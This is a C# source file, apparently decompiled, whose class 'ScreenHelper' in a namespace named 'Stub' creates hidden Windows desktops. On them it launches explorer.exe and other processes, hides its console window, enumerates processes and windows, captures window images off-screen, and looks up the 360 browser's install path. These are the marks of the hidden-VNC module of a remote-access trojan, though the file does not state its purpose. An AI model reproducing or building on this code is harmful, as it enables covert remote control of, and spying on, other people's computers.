using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Stub;

public class ScreenHelper : IDisposable, ICloneable
{
	public struct RECT
	{
		public int Left;

		public int Top;

		public int Right;

		public int Bottom;
	}

	public struct APPBARDATA
	{
		public int cbSize;

		public IntPtr hWnd;

		public int uCallbackMessage;

		public int uEdge;

		public RECT rc;

		public IntPtr lParam;
	}

	public struct EnumHwndsPrintData
	{
		public IntPtr hDc;

		public IntPtr hDcScreen;
	}

	public delegate bool EnumHwndsPrint(IntPtr hWnd, ref object lParam);

	private delegate bool EnumDesktopProc(string lpszDesktop, IntPtr lParam);

	private delegate bool EnumDesktopWindowsProc(IntPtr desktopHandle, IntPtr lParam);

	private struct PROCESS_INFORMATION
	{
		public IntPtr hProcess;

		public IntPtr hThread;

		public int dwProcessId;

		public int dwThreadId;
	}

	private struct STARTUPINFO
	{
		public int cb;

		public string lpReserved;

		public string lpDesktop;

		public string lpTitle;

		public int dwX;

		public int dwY;

		public int dwXSize;

		public int dwYSize;

		public int dwXCountChars;

		public int dwYCountChars;

		public int dwFillAttribute;

		public int dwFlags;

		public short wShowWindow;

		public short cbReserved2;

		public IntPtr lpReserved2;

		public IntPtr hStdInput;

		public IntPtr hStdOutput;

		public IntPtr hStdError;
	}

	private enum DESKTOP_ACCESS : uint
	{
		DESKTOP_NONE = 0u,
		DESKTOP_READOBJECTS = 1u,
		DESKTOP_CREATEWINDOW = 2u,
		DESKTOP_CREATEMENU = 4u,
		DESKTOP_HOOKCONTROL = 8u,
		DESKTOP_JOURNALRECORD = 16u,
		DESKTOP_JOURNALPLAYBACK = 32u,
		DESKTOP_ENUMERATE = 64u,
		DESKTOP_WRITEOBJECTS = 128u,
		DESKTOP_SWITCHDESKTOP = 256u,
		GENERIC_ALL = 511u
	}

	public struct Window
	{
		private IntPtr m_handle;

		private string m_text;

		public IntPtr Handle => this.m_handle;

		public string Text => this.m_text;

		public Window(IntPtr handle, string text)
		{
			this.m_handle = handle;
			this.m_text = text;
		}
	}

	public class WindowCollection : CollectionBase
	{
		public Window this[int index] => (Window)base.List[index];

		public void Add(Window wnd)
		{
			base.List.Add(wnd);
		}
	}

	public const int GW_HWNDLAST = 1;

	public const int GW_HWNDNEXT = 2;

	public const int GW_HWNDPREV = 3;

	public const int MaxWindowNameLength = 100;

	private static List<Bitmap> m_lstScreen = new List<Bitmap>();

	private static List<IntPtr> m_lstWindow = new List<IntPtr>();

	private static List<int> m_lstProcessID = new List<int>();

	private static IntPtr g_hCurWindow = IntPtr.Zero;

	private const short SW_HIDE = 0;

	private const short SW_NORMAL = 1;

	private const int STARTF_USESTDHANDLES = 256;

	private const int STARTF_USESHOWWINDOW = 1;

	private const int UOI_NAME = 2;

	private const int STARTF_USEPOSITION = 4;

	private const int NORMAL_PRIORITY_CLASS = 32;

	private const long DESKTOP_CREATEWINDOW = 2L;

	private const long DESKTOP_ENUMERATE = 64L;

	private const long DESKTOP_WRITEOBJECTS = 128L;

	private const long DESKTOP_SWITCHDESKTOP = 256L;

	private const long DESKTOP_CREATEMENU = 4L;

	private const long DESKTOP_HOOKCONTROL = 8L;

	private const long DESKTOP_READOBJECTS = 1L;

	private const long DESKTOP_JOURNALRECORD = 16L;

	private const long DESKTOP_JOURNALPLAYBACK = 32L;

	private const long AccessRights = 511L;

	private IntPtr m_desktop;

	private string m_desktopName;

	private static StringCollection m_sc;

	private ArrayList m_windows;

	private bool m_disposed;

	public static readonly ScreenHelper Default = ScreenHelper.OpenDefaultDesktop();

	public static readonly ScreenHelper Input = ScreenHelper.OpenInputDesktop();

	public bool IsOpen => this.m_desktop != IntPtr.Zero;

	public string DesktopName => this.m_desktopName;

	public IntPtr DesktopHandle => this.m_desktop;

	public static string FormatScreenResolution(Rectangle resolution)
	{
		return $"{resolution.Width}x{resolution.Height}";
	}

	[DllImport("user32.dll")]
	private static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice, IntPtr pDevmode, int dwFlags, long dwDesiredAccess, IntPtr lpsa);

	[DllImport("user32.dll")]
	private static extern bool CloseDesktop(IntPtr hDesktop);

	[DllImport("user32.dll")]
	private static extern IntPtr OpenDesktop(string lpszDesktop, int dwFlags, bool fInherit, long dwDesiredAccess);

	[DllImport("user32.dll")]
	private static extern IntPtr OpenInputDesktop(int dwFlags, bool fInherit, long dwDesiredAccess);

	[DllImport("user32.dll")]
	private static extern bool SwitchDesktop(IntPtr hDesktop);

	[DllImport("user32.dll")]
	private static extern bool EnumDesktops(IntPtr hwinsta, EnumDesktopProc lpEnumFunc, IntPtr lParam);

	[DllImport("user32.dll")]
	private static extern IntPtr GetProcessWindowStation();

	[DllImport("user32.dll")]
	private static extern bool EnumDesktopWindows(IntPtr hDesktop, EnumDesktopWindowsProc lpfn, IntPtr lParam);

	[DllImport("user32.dll")]
	private static extern bool SetThreadDesktop(IntPtr hDesktop);

	[DllImport("user32.dll")]
	private static extern IntPtr GetThreadDesktop(int dwThreadId);

	[DllImport("user32.dll")]
	private static extern bool GetUserObjectInformation(IntPtr hObj, int nIndex, IntPtr pvInfo, int nLength, ref int lpnLengthNeeded);

	[DllImport("user32.dll")]
	private static extern IntPtr GetDesktopWindow();

	[DllImport("user32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetDC(IntPtr hWnd);

	[DllImport("user32.dll", ExactSpelling = true)]
	private static extern IntPtr ReleaseDC(IntPtr hWnd, IntPtr hDC);

	[DllImport("gdi32.dll", ExactSpelling = true)]
	private static extern IntPtr BitBlt(IntPtr hDestDC, int x, int y, int nWidth, int nHeight, IntPtr hSrcDC, int xSrc, int ySrc, int dwRop);

	[DllImport("kernel32.dll")]
	private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);

	[DllImport("user32.dll")]
	public static extern int GetWindowText(IntPtr hWnd, IntPtr lpString, int nMaxCount);

	[DllImport("user32.dll")]
	public static extern IntPtr GetTopWindow(IntPtr hWnd);

	[DllImport("user32.dll")]
	public static extern IntPtr GetWindow(IntPtr hWnd, int nFlag);

	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool IsWindowVisible(IntPtr hWnd);

	[DllImport("user32.dll", CharSet = CharSet.Auto, EntryPoint = "GetWindow", SetLastError = true)]
	private static extern IntPtr GetNextWindow(IntPtr hwnd, [MarshalAs(UnmanagedType.U4)] int wFlag);

	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

	[DllImport("user32.dll")]
	public static extern int SetWindowLong(IntPtr hWnd, int nIndex, uint dwNewLong);

	[DllImport("user32.dll")]
	public static extern IntPtr GetWindowLong(IntPtr hWnd, int nIndex);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);

	[DllImport("SHELL32", CallingConvention = CallingConvention.StdCall)]
	public static extern uint SHAppBarMessage(int dwMessage, ref APPBARDATA pData);

	public ScreenHelper()
	{
		this.m_desktop = IntPtr.Zero;
		this.m_desktopName = string.Empty;
		this.m_windows = new ArrayList();
		this.m_disposed = false;
	}

	private ScreenHelper(IntPtr desktop)
	{
		this.m_desktop = desktop;
		this.m_desktopName = ScreenHelper.GetDesktopName(desktop);
		this.m_windows = new ArrayList();
		this.m_disposed = false;
	}

	~ScreenHelper()
	{
		this.Close();
	}

	public bool Create(string name)
	{
		this.CheckDisposed();
		if (this.m_desktop != IntPtr.Zero && !this.Close())
		{
			return false;
		}
		if (ScreenHelper.Exists(name))
		{
			return this.Open(name);
		}
		this.m_desktop = ScreenHelper.CreateDesktop(name, IntPtr.Zero, IntPtr.Zero, 0, 511L, IntPtr.Zero);
		this.m_desktopName = name;
		if (this.m_desktop == IntPtr.Zero)
		{
			return false;
		}
		return true;
	}

	public bool Close()
	{
		this.CheckDisposed();
		if (this.m_desktop != IntPtr.Zero)
		{
			bool num = ScreenHelper.CloseDesktop(this.DesktopHandle);
			if (num)
			{
				this.m_desktop = IntPtr.Zero;
				this.m_desktopName = string.Empty;
			}
			return num;
		}
		return true;
	}

	public bool Open(string name)
	{
		this.CheckDisposed();
		if (this.m_desktop != IntPtr.Zero && !this.Close())
		{
			return false;
		}
		this.m_desktop = ScreenHelper.OpenDesktop(name, 0, fInherit: false, 511L);
		if (this.m_desktop == IntPtr.Zero)
		{
			return false;
		}
		this.m_desktopName = name;
		return true;
	}

	public bool OpenInput()
	{
		this.CheckDisposed();
		if (this.m_desktop != IntPtr.Zero && !this.Close())
		{
			return false;
		}
		this.m_desktop = ScreenHelper.OpenInputDesktop(0, fInherit: true, 511L);
		if (this.m_desktop == IntPtr.Zero)
		{
			return false;
		}
		this.m_desktopName = ScreenHelper.GetDesktopName(this.m_desktop);
		return true;
	}

	public bool Show()
	{
		this.CheckDisposed();
		if (this.m_desktop == IntPtr.Zero)
		{
			return false;
		}
		return ScreenHelper.SwitchDesktop(this.m_desktop);
	}

	public WindowCollection GetWindows()
	{
		this.CheckDisposed();
		if (!this.IsOpen)
		{
			return null;
		}
		this.m_windows.Clear();
		WindowCollection windowCollection = new WindowCollection();
		if (!ScreenHelper.EnumDesktopWindows(this.m_desktop, new EnumDesktopWindowsProc(DesktopWindowsProc), IntPtr.Zero))
		{
			return null;
		}
		windowCollection = new WindowCollection();
		IntPtr intPtr = Marshal.AllocHGlobal(100);
		foreach (IntPtr window in this.m_windows)
		{
			ScreenHelper.GetWindowText(window, intPtr, 100);
			windowCollection.Add(new Window(window, Marshal.PtrToStringAnsi(intPtr)));
		}
		Marshal.FreeHGlobal(intPtr);
		return windowCollection;
	}

	private bool DesktopWindowsProc(IntPtr wndHandle, IntPtr lParam)
	{
		this.m_windows.Add(wndHandle);
		return true;
	}

	public static void EnumWindowsTopToDown(IntPtr owner, EnumHwndsPrint proc, object param)
	{
		IntPtr topWindow = ScreenHelper.GetTopWindow(owner);
		if (!(topWindow == IntPtr.Zero) && !((topWindow = ScreenHelper.GetWindow(topWindow, 1)) == IntPtr.Zero))
		{
			RECT lpRect = default(RECT);
			EnumHwndsPrintData enumHwndsPrintData = (EnumHwndsPrintData)param;
			while (proc(topWindow, ref param) && (topWindow = ScreenHelper.GetWindow(topWindow, 3)) != IntPtr.Zero)
			{
			}
			lpRect.Left = 0;
			lpRect.Top = 0;
			lpRect.Right = Screen.AllScreens[0].Bounds.Width;
			lpRect.Bottom = Screen.AllScreens[0].Bounds.Height;
			Bitmap bmpScreen = ScreenHelper.GetWindowImage(enumHwndsPrintData.hDcScreen, lpRect);
			if (bmpScreen != null && !ScreenHelper.IsBlackScreen(ref bmpScreen))
			{
				ScreenHelper.m_lstScreen.Add(bmpScreen);
			}
		}
	}

	public static bool EnumHwndsPrintMethod(IntPtr hWnd, ref object lParam)
	{
		EnumHwndsPrintData enumHwndsPrintData = (EnumHwndsPrintData)lParam;
		if (!ScreenHelper.IsWindowVisible(hWnd))
		{
			return true;
		}
		RECT lpRect = default(RECT);
		ScreenHelper.GetWindowRect(hWnd, out lpRect);
		int num = lpRect.Right - lpRect.Left;
		int num2 = lpRect.Bottom - lpRect.Top;
		if (num < 100 && num2 < 100)
		{
			return true;
		}
		ScreenHelper.PaintWindow(hWnd, enumHwndsPrintData.hDc, enumHwndsPrintData.hDcScreen);
		if (!ScreenHelper.m_lstWindow.Contains(hWnd))
		{
			ScreenHelper.m_lstWindow.Add(hWnd);
		}
		return true;
	}

	private static bool IsBlackScreen(ref Bitmap bmpScreen)
	{
		bool result = true;
		int num = 0;
		for (int i = 0; i < bmpScreen.Height; i += bmpScreen.Height / 12)
		{
			for (int j = 0; j < bmpScreen.Width; j++)
			{
				Color pixel = bmpScreen.GetPixel(j, i);
				if (pixel.R + pixel.G + pixel.B != 0)
				{
					num++;
				}
			}
		}
		if (num > 100)
		{
			result = false;
		}
		return result;
	}

	public static List<Bitmap> GetScreenList()
	{
		return ScreenHelper.m_lstScreen;
	}

	public static List<int> GetProcessIDList()
	{
		return ScreenHelper.m_lstProcessID;
	}

	public static IntPtr GetCurrentWindow()
	{
		return ScreenHelper.g_hCurWindow;
	}

	public static void SetCurrentWindow(IntPtr hCurWindow)
	{
		ScreenHelper.g_hCurWindow = hCurWindow;
	}

	public static bool PaintWindow(IntPtr hWnd, IntPtr hDC, IntPtr hDCScreen)
	{
		bool result = false;
		RECT lpRect = default(RECT);
		ScreenHelper.GetWindowRect(hWnd, out lpRect);
		IntPtr intPtr = PlatformInvokeGDI32.CreateCompatibleDC(hDC);
		IntPtr intPtr2 = PlatformInvokeGDI32.CreateCompatibleBitmap(hDC, lpRect.Right - lpRect.Left, lpRect.Bottom - lpRect.Top);
		PlatformInvokeGDI32.SelectObject(intPtr, intPtr2);
		if (PlatformInvokeUSER32.PrintWindow(hWnd, intPtr, 0u))
		{
			PlatformInvokeGDI32.BitBlt(hDCScreen, lpRect.Left, lpRect.Top, lpRect.Right - lpRect.Left, lpRect.Bottom - lpRect.Top, intPtr, 0, 0, 13369376);
			result = true;
		}
		PlatformInvokeGDI32.DeleteObject(intPtr2);
		PlatformInvokeGDI32.DeleteDC(intPtr);
		return result;
	}

	public static Bitmap GetWindowImage(IntPtr hDc, RECT lpRect)
	{
		IntPtr intPtr = PlatformInvokeGDI32.CreateCompatibleDC(hDc);
		IntPtr intPtr2 = PlatformInvokeGDI32.CreateCompatibleBitmap(hDc, lpRect.Right - lpRect.Left, lpRect.Bottom - lpRect.Top);
		PlatformInvokeGDI32.SelectObject(intPtr, intPtr2);
		PlatformInvokeGDI32.BitBlt(intPtr, lpRect.Left, lpRect.Top, lpRect.Right - lpRect.Left, lpRect.Bottom - lpRect.Top, hDc, 0, 0, 13369376);
		Bitmap result = Image.FromHbitmap(intPtr2);
		PlatformInvokeGDI32.DeleteObject(intPtr2);
		PlatformInvokeGDI32.DeleteDC(intPtr);
		return result;
	}

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	[DllImport("kernel32.dll")]
	public static extern bool FreeConsole();

	public bool CreateProcess(string path, bool bAppName)
	{
		this.CheckDisposed();
		IntPtr consoleWindow = ScreenHelper.GetConsoleWindow();
		if (!this.IsOpen)
		{
			return false;
		}
		STARTUPINFO lpStartupInfo = default(STARTUPINFO);
		lpStartupInfo.cb = Marshal.SizeOf(lpStartupInfo);
		lpStartupInfo.lpDesktop = this.m_desktopName;
		PROCESS_INFORMATION lpProcessInformation = default(PROCESS_INFORMATION);
		ScreenHelper.ShowWindow(consoleWindow, 0);
		bool flag = false;
		flag = (bAppName ? ScreenHelper.CreateProcess(path, null, IntPtr.Zero, IntPtr.Zero, bInheritHandles: false, 32, IntPtr.Zero, null, ref lpStartupInfo, ref lpProcessInformation) : ScreenHelper.CreateProcess(null, path, IntPtr.Zero, IntPtr.Zero, bInheritHandles: false, 32, IntPtr.Zero, null, ref lpStartupInfo, ref lpProcessInformation));
		ScreenHelper.CollectProcessAndChildren(lpProcessInformation.dwProcessId);
		return flag;
	}

	public static void KillProcessAndChildren(int pid)
	{
		if (pid == 0)
		{
			return;
		}
		foreach (ManagementObject item in new ManagementObjectSearcher("Select * From Win32_Process Where ParentProcessID=" + pid).Get())
		{
			ScreenHelper.KillProcessAndChildren(Convert.ToInt32(item["ProcessID"]));
		}
		try
		{
			Process.GetProcessById(pid).Kill();
		}
		catch (ArgumentException)
		{
		}
	}

	public static void CollectProcessAndChildren(int pid)
	{
		if (pid == 0)
		{
			return;
		}
		foreach (ManagementObject item in new ManagementObjectSearcher("Select * From Win32_Process Where ParentProcessID=" + pid).Get())
		{
			ScreenHelper.CollectProcessAndChildren(Convert.ToInt32(item["ProcessID"]));
		}
		ScreenHelper.m_lstProcessID.Add(pid);
	}

	public void Prepare()
	{
		this.CheckDisposed();
		if (this.IsOpen)
		{
			this.CreateProcess("explorer.exe", bAppName: true);
		}
	}

	public static string get360InstallPath()
	{
		string text = Registry.CurrentUser.OpenSubKey("Software\\\\360\\\\360se6\\\\Chrome", writable: true).GetValue("user_data_dir", true).ToString();
		return text.Substring(0, text.IndexOf("360se"));
	}

	public static string[] GetDesktops()
	{
		IntPtr processWindowStation = ScreenHelper.GetProcessWindowStation();
		if (processWindowStation == IntPtr.Zero)
		{
			return new string[0];
		}
		lock (ScreenHelper.m_sc = new StringCollection())
		{
			if (!ScreenHelper.EnumDesktops(processWindowStation, new EnumDesktopProc(DesktopProc), IntPtr.Zero))
			{
				return new string[0];
			}
			string[] array = new string[ScreenHelper.m_sc.Count];
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = ScreenHelper.m_sc[i];
			}
			return array;
		}
	}

	private static bool DesktopProc(string lpszDesktop, IntPtr lParam)
	{
		ScreenHelper.m_sc.Add(lpszDesktop);
		return true;
	}

	public static bool Show(string name)
	{
		bool flag = false;
		using ScreenHelper screenHelper = new ScreenHelper();
		if (!screenHelper.Open(name))
		{
			return false;
		}
		return screenHelper.Show();
	}

	public static ScreenHelper GetCurrent()
	{
		return new ScreenHelper(ScreenHelper.GetThreadDesktop(AppDomain.GetCurrentThreadId()));
	}

	public static bool SetCurrent(ScreenHelper desktop)
	{
		if (!desktop.IsOpen)
		{
			return false;
		}
		return ScreenHelper.SetThreadDesktop(desktop.DesktopHandle);
	}

	public static ScreenHelper OpenDesktop(string name)
	{
		ScreenHelper screenHelper = new ScreenHelper();
		if (!screenHelper.Open(name))
		{
			return null;
		}
		return screenHelper;
	}

	public static ScreenHelper OpenInputDesktop()
	{
		ScreenHelper screenHelper = new ScreenHelper();
		if (!screenHelper.OpenInput())
		{
			return null;
		}
		return screenHelper;
	}

	public static ScreenHelper OpenDefaultDesktop()
	{
		return ScreenHelper.OpenDesktop("Default");
	}

	public static ScreenHelper CreateDesktop(string name)
	{
		ScreenHelper screenHelper = new ScreenHelper();
		if (!screenHelper.Create(name))
		{
			return null;
		}
		return screenHelper;
	}

	public static string GetDesktopName(ScreenHelper desktop)
	{
		if (desktop.IsOpen)
		{
			return null;
		}
		return ScreenHelper.GetDesktopName(desktop.DesktopHandle);
	}

	public static IntPtr GetDesktopWindow(ScreenHelper desktop)
	{
		if (desktop.IsOpen)
		{
			return IntPtr.Zero;
		}
		return ScreenHelper.GetDesktopWindow();
	}

	public static bool GetWindowRect(out RECT lpRect)
	{
		return ScreenHelper.GetWindowRect(ScreenHelper.GetDesktopWindow(), out lpRect);
	}

	public static string GetDesktopName(IntPtr desktopHandle)
	{
		if (desktopHandle == IntPtr.Zero)
		{
			return null;
		}
		int lpnLengthNeeded = 0;
		string empty = string.Empty;
		ScreenHelper.GetUserObjectInformation(desktopHandle, 2, IntPtr.Zero, 0, ref lpnLengthNeeded);
		IntPtr intPtr = Marshal.AllocHGlobal(lpnLengthNeeded);
		bool userObjectInformation = ScreenHelper.GetUserObjectInformation(desktopHandle, 2, intPtr, lpnLengthNeeded, ref lpnLengthNeeded);
		empty = Marshal.PtrToStringAnsi(intPtr);
		Marshal.FreeHGlobal(intPtr);
		if (!userObjectInformation)
		{
			return null;
		}
		return empty;
	}

	public static bool Exists(string name)
	{
		return ScreenHelper.Exists(name, caseInsensitive: false);
	}

	public static bool Exists(string name, bool caseInsensitive)
	{
		string[] desktops = ScreenHelper.GetDesktops();
		foreach (string text in desktops)
		{
			if (caseInsensitive)
			{
				if (text.ToLower() == name.ToLower())
				{
					return true;
				}
			}
			else if (text == name)
			{
				return true;
			}
		}
		return false;
	}

	public static bool CreateProcess(string path, string desktop, bool bAppName)
	{
		if (!ScreenHelper.Exists(desktop))
		{
			return false;
		}
		return ScreenHelper.OpenDesktop(desktop).CreateProcess(path, bAppName);
	}

	public static Process[] GetInputProcesses()
	{
		Process[] processes = Process.GetProcesses();
		ArrayList arrayList = new ArrayList();
		string desktopName = ScreenHelper.GetDesktopName(ScreenHelper.Input.DesktopHandle);
		Process[] array = processes;
		foreach (Process process in array)
		{
			foreach (ProcessThread thread in process.Threads)
			{
				if (ScreenHelper.GetDesktopName(ScreenHelper.GetThreadDesktop(thread.Id)) == desktopName)
				{
					arrayList.Add(process);
					break;
				}
			}
		}
		Process[] array2 = new Process[arrayList.Count];
		for (int j = 0; j < array2.Length; j++)
		{
			array2[j] = (Process)arrayList[j];
		}
		return array2;
	}

	public void Dispose()
	{
		this.Dispose(disposing: true);
		GC.SuppressFinalize(this);
	}

	public virtual void Dispose(bool disposing)
	{
		if (!this.m_disposed)
		{
			this.Close();
		}
		this.m_disposed = true;
	}

	private void CheckDisposed()
	{
		if (this.m_disposed)
		{
			throw new ObjectDisposedException("");
		}
	}

	public object Clone()
	{
		this.CheckDisposed();
		ScreenHelper screenHelper = new ScreenHelper();
		if (this.IsOpen)
		{
			screenHelper.Open(this.m_desktopName);
		}
		return screenHelper;
	}

	public override string ToString()
	{
		return this.m_desktopName;
	}
}
